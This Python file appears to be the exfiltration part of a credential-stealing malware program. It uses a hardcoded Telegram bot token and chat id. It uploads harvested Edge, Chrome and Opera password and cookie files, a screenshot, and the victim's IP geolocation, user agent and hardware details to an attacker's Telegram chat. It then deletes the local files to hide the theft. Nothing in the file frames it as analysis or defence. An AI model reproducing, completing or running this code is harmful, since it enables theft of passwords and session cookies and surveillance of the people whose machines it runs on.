import telebot
import os
import sys
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import pyautogui
import platform
import psutil
import requests



TOKEN = '6410783052:AAGwQsVRg44VO1gwl86GRxc0ul32YibqqjY'
bot = telebot.TeleBot(TOKEN)

# Определение application_path в зависимости от режима запуска
if getattr(sys, 'frozen', False):
    application_path = os.path.dirname(sys.executable)
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

chat_id = '832620295'
passwords_filename_EDGE = "passwords-EDGE.json"
passwords_filename_CHROME = "passwords-CHROME.json"
passwords_filename_OPERA = 'passwords-OPERA.json'
cookies_filename_EDGE = "cookies-EDGE.json"
cookies_filename_CHROME = "cookies-CHROME.json"
cookies_filename_OPERA = "cookies-OPERA.json"
screenshot_filename = "screenshot.png"
downloads_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
file_path_passwords_EDGE = os.path.join(downloads_dir, passwords_filename_EDGE)
file_path_passwords_CHROME = os.path.join(downloads_dir, passwords_filename_CHROME)
file_path_passwords_OPERA = os.path.join(downloads_dir, passwords_filename_OPERA)
file_path_cookies_EDGE = os.path.join(downloads_dir, cookies_filename_EDGE)
file_path_cookies_CHROME = os.path.join(downloads_dir, cookies_filename_CHROME)
file_path_cookies_OPERA = os.path.join(downloads_dir, cookies_filename_OPERA)
file_path_screenshot = os.path.join(downloads_dir, screenshot_filename)

# User-Agent retriever
def get_user_agent():
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Runs Chrome in headless mode.
    driver = webdriver.Chrome(options=chrome_options)
    navigator_user_agent = driver.execute_script("return navigator.userAgent;")
    driver.quit()
    return navigator_user_agent

# Screen-resolution retriever
def get_screen_resolution():
    screen_width, screen_height = pyautogui.size()
    return f"{screen_width}x{screen_height}"

# Operating system info retriever
def get_os_info():
    return platform.platform()

# CPU cores number retriever
def get_cc_info():
    return os.cpu_count()

# RAM info retriever    
def get_ram_info():
    ram_info = psutil.virtual_memory()
    total_ram = ram_info.total / (1024**3)
    return f"{total_ram:.2f}"

# Screenshot retriever
def get_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(os.path.join(downloads_dir, 'screenshot.png'))


#Get info about IP
def get_ip_info():
    response = requests.get('https://ipinfo.io/json')
    return response.json()

ip_info = get_ip_info()


def send_files_to_chat():

    if os.path.exists(file_path_passwords_EDGE):
        with open(file_path_passwords_EDGE, 'rb') as file:
            bot.send_document(chat_id, file)

    if os.path.exists(file_path_passwords_CHROME):
        with open(file_path_passwords_CHROME, 'rb') as file:
            bot.send_document(chat_id, file)

    if os.path.exists(file_path_passwords_OPERA):
        with open(file_path_passwords_OPERA, 'rb') as file:
            bot.send_document(chat_id, file)
    
    if os.path.exists(file_path_cookies_EDGE):
        with open(file_path_cookies_EDGE, 'rb') as file:
            bot.send_document(chat_id, file)
    
    if os.path.exists(file_path_cookies_CHROME):
        with open(file_path_cookies_CHROME, 'rb') as file:
            bot.send_document(chat_id, file)
    
    if os.path.exists(file_path_cookies_OPERA):
        with open(file_path_cookies_OPERA, 'rb') as file:
            bot.send_document(chat_id, file)

def send_pc_info():
    user_agent = get_user_agent()
    screen_resolution = get_screen_resolution()
    os_info = get_os_info()
    cpu_info = get_cc_info()
    ram_info = get_ram_info()
    get_screenshot_image = get_screenshot()


    if os.path.exists(file_path_screenshot):
        with open(file_path_screenshot, 'rb') as photo:
            bot.send_photo(chat_id, photo, caption=f'''
IP ADDRESS - {ip_info.get('ip')}
COUNTRY AND CITY - {ip_info.get('country')}, {ip_info.get('city')}
INTERNET PROVIDER - {ip_info.get('org')}
USER-AGENT - {user_agent}
SCREEN RESOLUTION - {screen_resolution}
OPERATING SYSTEM - {os_info}
CPU INFO - {cpu_info}
RAM INFO - {round(float(ram_info))}''')

def delete_files():

    if os.path.exists(file_path_passwords_EDGE):
        os.remove(file_path_passwords_EDGE)

    if os.path.exists(file_path_passwords_CHROME):
        os.remove(file_path_passwords_CHROME)

    if os.path.exists(file_path_passwords_OPERA):
        os.remove(file_path_passwords_OPERA)

    if os.path.exists(file_path_cookies_EDGE):
        os.remove(file_path_cookies_EDGE)

    if os.path.exists(file_path_cookies_CHROME):
        os.remove(file_path_cookies_CHROME)

    if os.path.exists(file_path_cookies_OPERA):
        os.remove(file_path_cookies_OPERA)

    if os.path.exists(file_path_screenshot):
        os.remove(file_path_screenshot)



    



